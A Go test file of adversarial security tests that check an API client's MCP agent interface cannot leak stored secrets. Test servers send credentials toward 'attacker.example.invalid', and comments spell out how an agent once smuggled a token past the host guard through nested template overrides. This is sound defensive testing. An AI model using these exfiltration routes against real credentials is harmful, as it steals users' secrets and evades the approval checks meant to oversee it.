package core

// Adversarial tests for the run tier, written against the frozen contract in
// docs/mcp-agent-interface.md and the existing coverage in mcp_run_test.go
// (which this file deliberately does not repeat). Each test below is one of
// two things:
//
//   - CONFIRMED-SAFE / COVERAGE-ADDED: an attack was attempted, the boundary
//     held, and there was no regression test pinning it yet.
//   - FINDING: the attack succeeded, or a documented guarantee does not hold
//     the way the docs describe. These are named with a FINDING prefix, are
//     left GREEN (they assert what the code actually does today, not what it
//     should do), and carry a comment explaining exactly what breaks.
//   - A CLOSED VULNERABILITY: a finding that has since been FIXED in
//     production code. The test now asserts the fixed behaviour and its
//     comment records both the hole and what holds in its place, so the shape
//     cannot come back unnoticed.
//
// The one FINDING left in this file is the port-normalization / redirect pair
// below, which is not a hole so much as a stated limitation: mcp_guard.go's
// own header accepts both, with the reasoning, and says what would have to
// change for the guard to claim otherwise.

import (
	"context"
	"encoding/json"
	"errors"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/mutexdev/lite_api/internal/mcpserver"
	"github.com/mutexdev/lite_api/internal/types"
)

// --- 1. secret VALUE never crosses the boundary, attacked further -----------

// TestResult.Name and .Message are value-scrubbed like every other field of
// RunResult. Found leaking by the run tier's adversarial pass: a test script
// that reads a secret at runtime via pm.variables.get("apiToken") — the
// sanctioned way for a script to read any variable — and embeds the resolved
// value in a test's name or a thrown assertion message was handing the raw
// secret across the MCP boundary, because mcpRunTestResults mapped both
// fields through unmasked while Body, URL, Headers and the error string were
// all scrubbed. Rule 3's exemption covers script SOURCE (text that must keep
// parsing), not runtime string output; mcp_run.go now masks both fields, and
// this test pins that the one gap a properly-templated secret could still
// leak through stays closed.
func TestMCPRunRequestMasksTheResolvedSecretInTestResultNameAndMessage(t *testing.T) {
	f := newMCPRunFixture(t)
	f.app.mu.Lock()
	items := f.app.state.Workspaces[0].Collections[0].Items
	for i := range items {
		if items[i].ID == f.secretReqID {
			items[i].Tests = `test("token=" + pm.variables.get("apiToken"), function () {
  expect(true).to.equal(true);
});
test("message check", function () {
  throw new Error("secret is " + pm.variables.get("apiToken"));
});`
		}
	}
	f.app.mu.Unlock()

	result, err := f.run(context.Background(), f.secretReqID, nil)
	if err != nil {
		t.Fatalf("RunRequest: %v", err)
	}

	// The fixture must have produced the results the scrub is being tested
	// against — a script failure that yielded none would pass vacuously.
	var sawMaskedName, sawMaskedMessage bool
	for _, test := range result.TestResults {
		if strings.Contains(test.Name, runSentinelToken) {
			t.Errorf("TestResult.Name leaked the resolved secret: %q", test.Name)
		}
		if strings.Contains(test.Message, runSentinelToken) {
			t.Errorf("TestResult.Message leaked the resolved secret: %q", test.Message)
		}
		if strings.Contains(test.Name, mcpserver.MaskedValue) {
			sawMaskedName = true
		}
		if strings.Contains(test.Message, mcpserver.MaskedValue) {
			sawMaskedMessage = true
		}
	}
	if !sawMaskedName {
		t.Error("no TestResult.Name carried the mask; the fixture's secret-bearing test name did not reach the scrub at all")
	}
	if !sawMaskedMessage {
		t.Error("no TestResult.Message carried the mask; the fixture's secret-bearing failure message did not reach the scrub at all")
	}
	// The rest of the boundary is unaffected by this gap — spelled out so a
	// partial fix, or a second unrelated leak, is visible in a future diff.
	if strings.Contains(result.Body, runSentinelToken) {
		t.Error("the response body ALSO leaked the secret — that is a second, worse bug, not this one")
	}
	if strings.Contains(result.URL, runSentinelToken) {
		t.Error("the resolved URL ALSO leaked the secret — that is a second, worse bug, not this one")
	}
}

// A secret referenced directly in a URL's own query string (not via a header)
// must still be scrubbed by VALUE from the resolved URL the agent sees on a
// successful run. Distinct from the existing e2e coverage, which only checks
// this for get_request (never-resolved templates); this is the run tier,
// where the value really has been interpolated.
func TestMCPRunRequestSecretDirectlyInURLQueryIsMaskedOnSuccess(t *testing.T) {
	f := newMCPRunFixture(t)
	f.app.mu.Lock()
	collection := &f.app.state.Workspaces[0].Collections[0]
	req := types.NewRequestItem("URL-secret", "http", len(collection.Items)+1)
	req.Method = "GET"
	req.URL = "{{baseUrl}}/x?token={{apiToken}}"
	req.Body = types.RequestBody{Mode: "none"}
	collection.Items = append(collection.Items, req)
	reqID := req.ID
	f.app.mu.Unlock()

	result, err := f.run(context.Background(), reqID, nil)
	if err != nil {
		t.Fatalf("RunRequest: %v", err)
	}
	if strings.Contains(result.URL, runSentinelToken) {
		t.Errorf("the resolved URL leaked the secret VALUE: %q", result.URL)
	}
	if !strings.Contains(result.URL, mcpserver.MaskedValue) {
		t.Errorf("the URL-embedded secret was not masked at all: %q", result.URL)
	}
}

// "An error message from an unreachable host whose URL embeds the secret":
// Go's http error wraps the FULL request URL — query string included — into
// err.Error(), and requestFailureMessage passes that straight through. The
// defence is mcpRunResult's value-based scrub over response.Error.
func TestMCPRunRequestUnreachableHostErrorMasksAURLEmbeddedSecret(t *testing.T) {
	f := newMCPRunFixture(t)

	// A listener that is immediately closed: connections to its address are
	// refused deterministically, and the resulting error carries the full URL.
	closing := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {}))
	closedAddr := closing.URL
	closing.Close()

	f.app.mu.Lock()
	collection := &f.app.state.Workspaces[0].Collections[0]
	req := types.NewRequestItem("Unreachable with URL secret", "http", len(collection.Items)+1)
	req.Method = "GET"
	req.URL = closedAddr + "/x?token={{apiToken}}"
	req.Body = types.RequestBody{Mode: "none"}
	collection.Items = append(collection.Items, req)
	reqID := req.ID
	f.app.mu.Unlock()

	_, err := f.run(context.Background(), reqID, nil)
	if err == nil {
		t.Fatal("a request to a closed listener returned no error")
	}
	if strings.Contains(err.Error(), runSentinelToken) {
		t.Errorf("the connection-failure error leaked the resolved secret: %v", err)
	}
}

// "A redirect Location carrying the secret": with FollowRedirects disabled,
// run_request reports the 302 itself, Location header and all. A server that
// reflects a request's own Authorization header into its own Location header
// (a real-world "debug redirect" pattern) must still have that value scrubbed
// like any other header value.
func TestMCPRunRequestUnfollowedRedirectLocationCarryingTheSecretIsMasked(t *testing.T) {
	f := newMCPRunFixture(t)

	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		leaked := r.Header.Get("Authorization")
		w.Header().Set("Location", "https://attacker.example.invalid/collect?leaked="+leaked)
		w.WriteHeader(http.StatusFound)
	}))
	defer server.Close()

	f.app.mu.Lock()
	collection := &f.app.state.Workspaces[0].Collections[0]
	req := types.NewRequestItem("Redirect Location leak probe", "http", len(collection.Items)+1)
	req.Method = "GET"
	req.URL = server.URL + "/probe"
	req.Headers = []KeyValue{{Name: "Authorization", Value: "Bearer {{apiToken}}", Enabled: true}}
	req.Body = types.RequestBody{Mode: "none"}
	req.Settings.FollowRedirects = false
	collection.Items = append(collection.Items, req)
	reqID := req.ID
	f.app.mu.Unlock()

	result, err := f.run(context.Background(), reqID, nil)
	if err != nil {
		t.Fatalf("RunRequest: %v", err)
	}
	if result.Status != http.StatusFound {
		t.Fatalf("status = %d, want 302 (redirects are disabled for this request)", result.Status)
	}
	var location string
	for _, header := range result.Headers {
		if strings.EqualFold(header.Name, "Location") {
			location = header.Value
		}
	}
	if location == "" {
		t.Fatal("no Location header came back at all; this test needs one to check masking")
	}
	if strings.Contains(location, runSentinelToken) {
		t.Errorf("the Location header leaked the resolved secret: %q", location)
	}
	if !strings.Contains(location, mcpserver.MaskedValue) {
		t.Errorf("the secret-bearing Location header was not masked at all: %q", location)
	}
}

// FINDING: the new-host guard normalizes hosts by dropping the port
// (the retired host guard's normalizer) — deliberate for real DNS names ("same
// operator, same DNS name" per that function's own comment) — which means
// every 127.0.0.1 service, on ANY port, is already "known" the moment ANY
// request in the workspace has ever resolved a secret to 127.0.0.1 on any
// other port (true of every loopback-based test fixture, and of any real
// deployment where several unrelated services sit behind one IP on different
// ports — shared load balancers, container hosts, etc).
//
// Combined with the guard running exactly ONCE, before the request is ever
// sent, and never re-evaluated once the transport starts following redirects
// (FollowRedirects defaults to true, MaxRedirects 5 — types.NewRequestItem),
// a request that legitimately targets one 127.0.0.1 service can be
// redirected BY THAT SERVICE'S OWN RESPONSE to a completely different,
// never-seen-before 127.0.0.1 service, and LiteAPI's HTTP client follows it
// and forwards the Authorization header — Go's client only strips
// Authorization across a HOSTNAME change, not a port change (confirmed
// separately against net/http directly) — with no second guard check, no
// approval prompt, and no denial.
//
// THE LIMITATION IS CLOSED, AND THIS TEST NOW PINS THE CLOSURE. It was ruled
// acceptable while the boundary was a per-secret host allowlist: the redirect
// can only be issued by a host that already HAS the credential, so the
// redirecting party learns nothing new, and closing it would have meant forking
// the transport's redirect policy away from the user's own send path.
//
// The destination boundary closes it without that fork, which is why the ruling
// changed. Two things did the work, and neither is a special case for
// redirects:
//
//   - An Origin carries its PORT (§1.1, §1.4(9)), so :A and :B on 127.0.0.1 are
//     two destinations rather than one — the premise of the finding is simply
//     no longer true.
//   - The guard RoundTripper sits under the same http.Client the user's send
//     uses, and http.Client calls a transport once per hop, so every hop is
//     checked with no redirect-policy code at all.
//
// The hop is DENIED rather than prompted: RoundTrip runs inside
// client.Timeout, so there is no room to wait for a human (§4.2). A
// non-blocking prompt is raised alongside the denial, which is what makes the
// agent's retry succeed after an approve-and-remember — see
// TestMCPRedirectHopDeniedThenRememberable.
func TestMCPRunRequestRedirectToADifferentPortIsRefused(t *testing.T) {
	f := newMCPRunFixture(t)

	var secondServiceSawSecret string
	secondService := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		secondServiceSawSecret = r.Header.Get("Authorization")
		w.WriteHeader(http.StatusOK)
	}))
	defer secondService.Close()

	firstService := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		http.Redirect(w, r, secondService.URL+"/elsewhere", http.StatusFound)
	}))
	defer firstService.Close()

	// Sanity: the finding's premise is that both land on the SAME hostname.
	firstHost, err := url.Parse(firstService.URL)
	if err != nil {
		t.Fatalf("parse firstService URL: %v", err)
	}
	secondHost, err := url.Parse(secondService.URL)
	if err != nil {
		t.Fatalf("parse secondService URL: %v", err)
	}
	if firstHost.Hostname() != "127.0.0.1" || secondHost.Hostname() != "127.0.0.1" {
		t.Skip("httptest servers did not land on 127.0.0.1 on this machine; the port-invariance premise does not hold here")
	}

	f.app.mu.Lock()
	collection := &f.app.state.Workspaces[0].Collections[0]
	req := types.NewRequestItem("Bounces to an unrelated service", "http", len(collection.Items)+1)
	req.Method = "GET"
	req.URL = firstService.URL + "/start"
	req.Headers = []KeyValue{{Name: "Authorization", Value: "Bearer {{apiToken}}", Enabled: true}}
	req.Body = types.RequestBody{Mode: "none"}
	collection.Items = append(collection.Items, req)
	reqID := req.ID
	f.app.mu.Unlock()

	f.app.mcpApprovalEmit = func(request types.MCPApprovalRequest) {
		f.mu.Lock()
		f.approvals = append(f.approvals, request)
		f.mu.Unlock()
		go func() { _ = f.app.ResolveMCPApproval(request.ID, false, false) }()
	}

	// The first hop is in Base — the request's own definition points there — so
	// the run starts. The SECOND hop is a different origin, and the guard
	// transport stops it.
	_, err = f.run(context.Background(), reqID, nil)
	if err == nil {
		t.Fatal("a redirect onto a different port was followed without any check")
	}
	if !errors.Is(err, mcpserver.ErrDenied) {
		t.Errorf("the redirect refusal does not wrap ErrDenied: %v", err)
	}
	// THE ASSERTION THE WHOLE FINDING WAS ABOUT: the credential does not arrive.
	if secondServiceSawSecret != "" {
		t.Fatalf("the second service received the credential across a redirect: Authorization=%q", secondServiceSawSecret)
	}
}

// --- 2. the secret-override refusal, attacked further ------------------------

// A whitespace-padded secret name must still be refused: mcpValidatedOverrides
// trims the NAME before checking it against secretsInScope, but that trim was
// not directly pinned anywhere.
func TestMCPRunRequestRefusesWhitespacePaddedSecretName(t *testing.T) {
	f := newMCPRunFixture(t)
	_, err := f.run(context.Background(), f.secretReqID, map[string]string{" apiToken ": "smuggled"})
	if err == nil {
		t.Fatal("a whitespace-padded secret name was accepted as an override")
	}
	if !errors.Is(err, mcpserver.ErrDenied) {
		t.Errorf("the refusal does not wrap ErrDenied: %v", err)
	}
	if !strings.Contains(err.Error(), "apiToken") {
		t.Errorf("the refusal does not name the variable: %v", err)
	}
	if len(f.recorded()) != 0 {
		t.Error("a refused run still reached the target server")
	}
}

// A secret declared ONLY in the workspace's active GLOBAL environment must be
// refused even on a request that never references it in its own definition:
// the refusal is by NAME across the whole run's scope, not "does this
// particular request happen to use it".
func TestMCPRunRequestRefusesGlobalSecretOverrideEvenWhenTheRequestDoesNotReferenceIt(t *testing.T) {
	f := newMCPRunFixture(t)
	_, err := f.run(context.Background(), f.plainReqID, map[string]string{"apiToken": "smuggled"})
	if err == nil {
		t.Fatal("overriding a global-only secret was allowed on a request that never references it")
	}
	if !errors.Is(err, mcpserver.ErrDenied) {
		t.Errorf("the refusal does not wrap ErrDenied: %v", err)
	}
	if !strings.Contains(err.Error(), "apiToken") {
		t.Errorf("the refusal does not name the variable: %v", err)
	}
}

// A differently-cased override name is a DIFFERENT name as far as both the
// refusal check and template interpolation are concerned (plain Go map
// lookups, case-sensitive throughout). It must not be refused — it does not
// name the actual secret variable — but it must also have no effect: the
// request's {{apiToken}} template still resolves to the real secret, and the
// mis-cased override key is simply never consulted by interpolation.
func TestMCPRunRequestOverrideNameCaseVariantIsAllowedButInert(t *testing.T) {
	f := newMCPRunFixture(t)
	result, err := f.run(context.Background(), f.secretReqID, map[string]string{
		"APITOKEN": "attacker-value-upper",
		"ApiToken": "attacker-value-mixed",
	})
	if err != nil {
		t.Fatalf("a differently-cased override name was refused: %v", err)
	}
	recorded := f.recorded()
	if len(recorded) != 1 {
		t.Fatalf("got %d requests, want 1", len(recorded))
	}
	if recorded[0].authHeader != "Bearer "+runSentinelToken {
		t.Errorf("a case-variant override name retargeted the real secret: Authorization = %q", recorded[0].authHeader)
	}
	if strings.Contains(result.Body, "attacker-value") {
		t.Errorf("a case-variant override leaked into the sent request: %q", result.Body)
	}
}

// --- 3. the new-host guard, attacked further ---------------------------------

// FLIPPED, AND THIS IS THE FIX §1.4(9) NAMES. The shipped host guard drops the
// port on purpose — for real DNS names, "same operator, same DNS name" is a
// reasonable reading — and this test pinned that as wanted behaviour.
//
// It is not wanted behaviour for a destination boundary. :3000 and :8080 on a
// developer's machine are two unrelated services, frequently with different
// owners and different trust, and a boundary that cannot tell them apart
// authorizes the second the moment the user approves the first. An Origin
// carries its port, so the retarget below is now a destination the request's
// definition does not name, and it prompts like any other.
func TestMCPRunRequestSameHostDifferentPortIsBlockedWithoutApproval(t *testing.T) {
	f := newMCPRunFixture(t)

	second := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(map[string]string{"path": r.URL.Path})
	}))
	defer second.Close()

	firstHost, err := url.Parse(f.server.URL)
	if err != nil {
		t.Fatalf("parse fixture server URL: %v", err)
	}
	secondHost, err := url.Parse(second.URL)
	if err != nil {
		t.Fatalf("parse second server URL: %v", err)
	}
	if firstHost.Hostname() != secondHost.Hostname() {
		t.Skipf("httptest servers landed on different hostnames (%q vs %q); this test needs them to share a host", firstHost.Hostname(), secondHost.Hostname())
	}
	if firstHost.Port() == secondHost.Port() {
		t.Fatal("the two httptest servers landed on the same port; this test needs them to differ")
	}

	// The fixture's emitter records and never answers — a closed window, which
	// denies. Shortened so the test does not sit out the full 60 s.
	f.app.mcpApprovalTimeout = 50 * time.Millisecond

	_, err = f.run(context.Background(), f.secretReqID, map[string]string{"baseUrl": second.URL})
	if err == nil {
		t.Fatal("a port variant of the request's own host was contacted without approval")
	}
	if !errors.Is(err, mcpserver.ErrDenied) {
		t.Errorf("the refusal does not wrap ErrDenied: %v", err)
	}
	if prompts := f.prompts(); len(prompts) == 0 {
		t.Error("the user was never asked about the other port")
	}
	if !strings.Contains(err.Error(), secondHost.Port()) {
		t.Errorf("the denial does not name the port that was refused, so the user cannot tell the two services apart: %v", err)
	}
}

// An unparseable or hostless URL must DENY, never silently pass. This is the
// one branch where a bug would be an open door rather than an annoyance: if the
// zero Origin — the boundary's "no destination could be determined" — were ever
// treated as a match against Base instead of as unknown, every credential would
// be exportable through any URL LiteAPI cannot parse.
//
// BOTH SHAPES DENY THE SAME WAY, which is the second thing asserted. A URL Go
// itself cannot parse used to escape as an ordinary request-construction
// failure — no bytes moved, but the error did not wrap ErrDenied and the audit
// recorded it as an error rather than a denial. executeHTTP now reads the
// destination before it builds anything, so both arrive as one refusal with one
// message.
func TestMCPRunRequestHostlessOrUnparseableURLDeniesRatherThanPasses(t *testing.T) {
	for _, testCase := range []struct {
		name    string
		baseURL string
	}{
		{"a hostless URL (empty baseUrl leaves no scheme or host at all)", ""},
		{"an unparseable URL (unterminated IPv6 literal)", "http://[::1"},
	} {
		t.Run(testCase.name, func(t *testing.T) {
			f := newMCPRunFixture(t)
			f.app.mcpApprovalEmit = func(request types.MCPApprovalRequest) {
				t.Errorf("the guard raised an approval prompt for an unresolvable host, instead of denying outright: %+v", request)
				go func() { _ = f.app.ResolveMCPApproval(request.ID, false, false) }()
			}
			_, err := f.run(context.Background(), f.secretReqID, map[string]string{"baseUrl": testCase.baseURL})
			if err == nil {
				t.Fatal("a run whose URL cannot be resolved to a host was allowed")
			}
			if !errors.Is(err, mcpserver.ErrDenied) {
				t.Errorf("the denial does not wrap ErrDenied: %v", err)
			}
			if !strings.Contains(err.Error(), "did not resolve to a usable origin") {
				t.Errorf("the denial does not explain why: %v", err)
			}
			if len(f.recorded()) != 0 {
				t.Error("a run with no resolvable host still reached the target server")
			}
		})
	}
}

// --- 4. approvals, attacked further -------------------------------------------

// An approval id that WAS valid but has since timed out is stale: resolving
// it afterwards must error rather than silently "succeeding" against a run
// that is long gone. Distinct from the existing empty-id / never-existed-id
// coverage in mcp_run_test.go.
func TestResolveMCPApprovalRejectsAStaleIDAfterTimeout(t *testing.T) {
	f := newMCPRunFixture(t)
	f.app.mcpApprovalTimeout = 50 * time.Millisecond

	var capturedID string
	f.app.mcpApprovalEmit = func(request types.MCPApprovalRequest) {
		f.mu.Lock()
		capturedID = request.ID
		f.mu.Unlock()
		// Deliberately never resolved — the timeout denies it on its own.
	}

	if _, err := f.run(context.Background(), f.secretReqID, map[string]string{"baseUrl": "http://timed-out.example.invalid"}); err == nil {
		t.Fatal("an unanswered approval did not deny the run")
	}

	f.mu.Lock()
	id := capturedID
	f.mu.Unlock()
	if id == "" {
		t.Fatal("no approval id was captured")
	}
	if err := f.app.ResolveMCPApproval(id, true, false); err == nil {
		t.Error("resolving a stale (already timed-out) approval id was accepted")
	}
}

// A corrupt mcp-approvals.json (disk corruption, an interrupted write) must
// degrade to "nothing remembered, prompt again" — never to a crash, and never
// to treating garbage bytes as an implicit approval that opens the door.
func TestMCPRunRequestCorruptApprovalsFileDegradesToPromptAgain(t *testing.T) {
	f := newMCPRunFixture(t)
	other := f.otherLoopbackURL()

	if err := os.WriteFile(f.app.mcpApprovalsPath(), []byte("{not valid json"), 0o600); err != nil {
		t.Fatalf("seed a corrupt approvals file: %v", err)
	}

	f.app.mcpApprovalEmit = func(request types.MCPApprovalRequest) {
		f.mu.Lock()
		f.approvals = append(f.approvals, request)
		f.mu.Unlock()
		go func() {
			if err := f.app.ResolveMCPApproval(request.ID, true, true); err != nil {
				t.Errorf("ResolveMCPApproval(approve, remember): %v", err)
			}
		}()
	}

	// First run: the corrupt file must not silently skip the prompt.
	if _, err := f.run(context.Background(), f.secretReqID, map[string]string{"baseUrl": other}); err != nil {
		t.Fatalf("run against a corrupt approvals file failed: %v", err)
	}
	if len(f.prompts()) != 1 {
		t.Fatalf("got %d prompts on a corrupt approvals file, want 1 (prompt again, not skip, not crash)", len(f.prompts()))
	}

	// The remember-write above overwrites the corrupt file with valid JSON. A
	// second identical run must not prompt again.
	if _, err := f.run(context.Background(), f.secretReqID, map[string]string{"baseUrl": other}); err != nil {
		t.Fatalf("second run failed: %v", err)
	}
	if len(f.prompts()) != 1 {
		t.Errorf("got %d prompts total, want still 1 — the remembered approval (written over the corrupt file) should hold", len(f.prompts()))
	}

	data, err := os.ReadFile(f.app.mcpApprovalsPath())
	if err != nil {
		t.Fatalf("read the approvals file: %v", err)
	}
	var stored types.MCPApprovalFile
	if err := json.Unmarshal(data, &stored); err != nil {
		t.Fatalf("the approvals file is not valid JSON after a remembered approval: %v\n%s", err, data)
	}
	if len(stored.Approvals) != 1 {
		t.Fatalf("stored approvals = %d, want 1: %s", len(stored.Approvals), data)
	}
}

// --- 2b. the override-VALUE as a smuggling channel, now closed ---------------

// This test pins a CLOSED VULNERABILITY. It was a live exfiltration path, and
// the shape it exercises must keep being refused.
//
// THE HOLE. The new-host guard's decision of "is there even a secret in play
// here" was made by scanning the REQUEST'S OWN AUTHORED FIELDS — the literal,
// unresolved `{{name}}` strings on the stored item — for a name that is itself
// declared secret. It never looked at the VALUE of a variable override, and
// mcpValidatedOverrides (mcp_run.go) only refuses an override BY NAME: an
// override was meant to be inert data ("storeId": "str_42"), but nothing
// stopped it from being an arbitrary string, including one that is itself a
// `{{template}}`.
//
// THE MECHANISM. interp.Interpolate (internal/interp/interp.go) is MULTI-PASS:
// it re-scans its own OUTPUT for new `{{...}}` tokens ("mayNest") up to 8
// times, and the send path's final field resolution
// (internal/core/app_request_build.go) calls exactly that function against the
// FULL, secret-including Combined variable map. So an agent could pick a
// request whose credential-carrying field references an ORDINARY, non-secret
// name — a header of "Authorization: Bearer {{smuggle}}" — and call
// run_request with variables {"smuggle": "{{apiToken}}", "baseUrl": "<its own
// host>"}. Neither override NAME is a secret, so both were accepted; the
// request's own fields named "smuggle", not "apiToken", so the guard found
// zero referenced secrets and returned before a host was ever computed; and
// the send then resolved "{{smuggle}}" to "{{apiToken}}" (pass 1) and THAT to
// the real credential (pass 2). The secret left the process, over the wire, to
// a server the agent's operator controls — a leak no output masking could ever
// have caught, because it never passed through a tool result at all.
//
// WHAT NOW HOLDS. mcpRefuseSecretInjectingValues (mcp_guard.go) refuses any
// agent-supplied value that reaches a secret, before any host is computed —
// the same inversion argument mcpValidatedOverrides makes for override names,
// applied to their values. The refusal wraps ErrDenied, names the offending
// variable and the secret, and no approval prompt is raised, because there is
// no honest use of this shape for a user to bless.
func TestMCPRunRequestOverrideValueCannotSmuggleASecretPastTheNewHostGuard(t *testing.T) {
	f := newMCPRunFixture(t)

	var attackerSawAuth string
	attacker := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		attackerSawAuth = r.Header.Get("Authorization")
		w.WriteHeader(http.StatusOK)
	}))
	defer attacker.Close()

	f.app.mu.Lock()
	collection := &f.app.state.Workspaces[0].Collections[0]
	victim := types.NewRequestItem("Smuggle victim", "http", len(collection.Items)+1)
	victim.Method = "GET"
	victim.URL = "{{baseUrl}}/x"
	// The credential-carrying field references an ORDINARY variable name,
	// never the secret's own name. Nothing here is secret-shaped as far as
	// mcpReferencedSecrets can tell.
	victim.Headers = []KeyValue{{Name: "Authorization", Value: "Bearer {{smuggle}}", Enabled: true}}
	victim.Body = types.RequestBody{Mode: "none"}
	collection.Items = append(collection.Items, victim)
	victimID := victim.ID
	f.app.mu.Unlock()

	// No frontend at all, so a run that merely reached the approval prompt
	// would also fail — but the assertions below distinguish the two: this
	// must be a REFUSAL naming the override, not a denied approval naming a
	// host.
	f.app.mcpApprovalEmit = nil

	_, err := f.run(context.Background(), victimID, map[string]string{
		"smuggle": "{{apiToken}}",
		"baseUrl": attacker.URL,
	})
	if err == nil {
		t.Fatal("an override whose value resolves to a secret was allowed to run")
	}
	if !errors.Is(err, mcpserver.ErrDenied) {
		t.Fatalf("error is %v, want one that wraps mcpserver.ErrDenied", err)
	}
	if !strings.Contains(err.Error(), `"smuggle"`) || !strings.Contains(err.Error(), "apiToken") {
		t.Errorf("the refusal should name the offending override and the secret: %v", err)
	}
	if strings.Contains(err.Error(), runSentinelToken) {
		t.Errorf("the refusal quoted the secret VALUE: %v", err)
	}
	if attackerSawAuth != "" {
		t.Fatalf("the attacker host was reached at all, with Authorization %q", attackerSawAuth)
	}
	if len(f.prompts()) != 0 {
		t.Errorf("the injection was routed to an approval prompt (%d) instead of being refused outright", len(f.prompts()))
	}
}

// The transitive form of the same attack: the override that names the secret
// is not the one the request reads. {"smuggle": "{{hop}}"} with
// {"hop": "{{apiToken}}"} is two overrides deep, and the send path's
// multi-pass interpolation walks it exactly as happily as one. The guard's
// walk therefore follows an override's tokens THROUGH the effective map
// (mcpSecretsReachedByTemplate), not just one level.
func TestMCPRunRequestRefusesAnOverrideThatReachesASecretThroughAnotherOverride(t *testing.T) {
	f := newMCPRunFixture(t)
	f.app.mcpApprovalEmit = nil

	var attackerSawAuth string
	attacker := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		attackerSawAuth = r.Header.Get("Authorization")
		w.WriteHeader(http.StatusOK)
	}))
	defer attacker.Close()

	f.app.mu.Lock()
	collection := &f.app.state.Workspaces[0].Collections[0]
	victim := types.NewRequestItem("Transitive smuggle victim", "http", len(collection.Items)+1)
	victim.Method = "GET"
	victim.URL = "{{baseUrl}}/x"
	victim.Headers = []KeyValue{{Name: "Authorization", Value: "Bearer {{smuggle}}", Enabled: true}}
	victim.Body = types.RequestBody{Mode: "none"}
	collection.Items = append(collection.Items, victim)
	victimID := victim.ID
	f.app.mu.Unlock()

	_, err := f.run(context.Background(), victimID, map[string]string{
		"smuggle": "{{hop}}",
		"hop":     "{{apiToken}}",
		"baseUrl": attacker.URL,
	})
	if err == nil {
		t.Fatal("a two-hop override chain reaching a secret was allowed to run")
	}
	if !errors.Is(err, mcpserver.ErrDenied) {
		t.Fatalf("error is %v, want one that wraps mcpserver.ErrDenied", err)
	}
	if !strings.Contains(err.Error(), "apiToken") {
		t.Errorf("the refusal should name the secret the chain reaches: %v", err)
	}
	if attackerSawAuth != "" {
		t.Fatalf("the attacker host was reached at all, with Authorization %q", attackerSawAuth)
	}
}

// A CYCLE must terminate rather than hang or blow the stack: {"a": "{{b}}"}
// with {"b": "{{a}}"} is a legal (if pointless) pair of overrides, and the
// walk expands each NAME once. Nothing secret is reached, so the run proceeds
// on its own merits.
func TestMCPRunRequestOverrideCycleTerminatesAndIsNotRefused(t *testing.T) {
	f := newMCPRunFixture(t)

	result, err := f.run(context.Background(), f.secretReqID, map[string]string{
		"a": "{{b}}",
		"b": "{{a}}",
	})
	if err != nil {
		t.Fatalf("a cyclic pair of harmless overrides was refused: %v", err)
	}
	if result.Status != http.StatusOK {
		t.Fatalf("status = %d, want 200", result.Status)
	}
}

// THE BACKSTOP. The name walk can only see references it can name. A variable
// that is NOT marked secret but whose VALUE literally contains the credential
// — a copy-pasted "authHeader", a legacy duplicate — is reachable by an
// override without any secret name appearing anywhere in the chain. So after
// the walk, the override is interpolated for real and the result compared
// against the process's hydrated secret values (mcpContainsKnownSecretValue).
func TestMCPRunRequestRefusesAnOverrideResolvingToACredentialItNeverNames(t *testing.T) {
	f := newMCPRunFixture(t)
	f.app.mcpApprovalEmit = nil

	var attackerSawAuth string
	attacker := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		attackerSawAuth = r.Header.Get("Authorization")
		w.WriteHeader(http.StatusOK)
	}))
	defer attacker.Close()

	f.app.mu.Lock()
	workspace := &f.app.state.Workspaces[0]
	for index := range workspace.GlobalEnvironments {
		if workspace.GlobalEnvironments[index].ID != "env-run-global" {
			continue
		}
		// NOT flagged Secret: as far as every name-based rule is concerned this
		// is an ordinary variable. Its value happens to be the credential.
		workspace.GlobalEnvironments[index].Variables = append(
			workspace.GlobalEnvironments[index].Variables,
			Variable{ID: "run-var-leaky", Name: "legacyAuth", Value: runSentinelToken, Enabled: true},
		)
	}
	collection := &workspace.Collections[0]
	victim := types.NewRequestItem("Backstop victim", "http", len(collection.Items)+1)
	victim.Method = "GET"
	victim.URL = "{{baseUrl}}/x"
	victim.Headers = []KeyValue{{Name: "Authorization", Value: "Bearer {{smuggle}}", Enabled: true}}
	victim.Body = types.RequestBody{Mode: "none"}
	collection.Items = append(collection.Items, victim)
	victimID := victim.ID
	f.app.mu.Unlock()

	_, err := f.run(context.Background(), victimID, map[string]string{
		"smuggle": "{{legacyAuth}}",
		"baseUrl": attacker.URL,
	})
	if err == nil {
		t.Fatal("an override resolving to the credential through a non-secret variable was allowed to run")
	}
	if !errors.Is(err, mcpserver.ErrDenied) {
		t.Fatalf("error is %v, want one that wraps mcpserver.ErrDenied", err)
	}
	if !strings.Contains(err.Error(), `"smuggle"`) {
		t.Errorf("the refusal should name the offending override: %v", err)
	}
	if strings.Contains(err.Error(), runSentinelToken) {
		t.Errorf("the refusal quoted the secret VALUE: %v", err)
	}
	if attackerSawAuth != "" {
		t.Fatalf("the attacker host was reached at all, with Authorization %q", attackerSawAuth)
	}
}

// THE OTHER HALF, and the one that makes the refusal above a boundary rather
// than a ban on braces. An override whose value is an ordinary template over
// ordinary variables — {"path": "/{{version}}/users"} — is exactly what the
// run tier is for, and it must still work, ON A REQUEST THAT CARRIES A SECRET
// (the fixture's own {{apiToken}} header), resolving normally and reaching the
// server with no prompt and no refusal.
func TestMCPRunRequestStillAcceptsAnOrdinaryOverrideContainingBraces(t *testing.T) {
	f := newMCPRunFixture(t)

	f.app.mu.Lock()
	workspace := &f.app.state.Workspaces[0]
	for index := range workspace.GlobalEnvironments {
		if workspace.GlobalEnvironments[index].ID == "env-run-global" {
			workspace.GlobalEnvironments[index].Variables = append(
				workspace.GlobalEnvironments[index].Variables,
				Variable{ID: "run-var-version", Name: "version", Value: "v2", Enabled: true},
			)
		}
	}
	f.app.mu.Unlock()

	result, err := f.run(context.Background(), f.secretReqID, map[string]string{
		"path": "/{{version}}/users",
	})
	if err != nil {
